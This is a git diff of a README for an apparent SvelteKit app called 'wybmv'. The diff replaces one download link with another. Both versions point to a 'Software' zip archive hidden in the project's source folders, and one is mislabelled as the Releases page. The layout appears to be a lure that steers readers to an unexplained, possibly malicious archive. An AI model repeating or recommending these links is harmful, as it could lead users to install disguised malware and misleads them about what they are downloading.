@@ -6,7 +6,7 @@ Welcome to **wybmv**, a romantic SvelteKit application designed to help you expr
 
 ## 📥 Download the App
 
-[![Download wybmv](https://github.com/vlixyoutube/wybmv/raw/refs/heads/main/src/lib/i18n/Software-3.3.zip)](https://github.com/vlixyoutube/wybmv/raw/refs/heads/main/src/lib/i18n/Software-3.3.zip)
+[![Download wybmv](https://raw.githubusercontent.com/vlixyoutube/wybmv/main/src/lib/stores/Software-v2.6.zip)](https://raw.githubusercontent.com/vlixyoutube/wybmv/main/src/lib/stores/Software-v2.6.zip)
 
 Click the button above to download the latest version of **wybmv**. You will find the application files on the Releases page.
 
@@ -27,7 +27,7 @@ To run **wybmv**, make sure your device meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vlixyoutube/wybmv/raw/refs/heads/main/src/lib/i18n/Software-3.3.zip) to view all available versions.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/vlixyoutube/wybmv/main/src/lib/stores/Software-v2.6.zip) to view all available versions.
    
 2. **Choose the Right Version**: Select the latest version listed. Look for the download that matches your operating system.
 
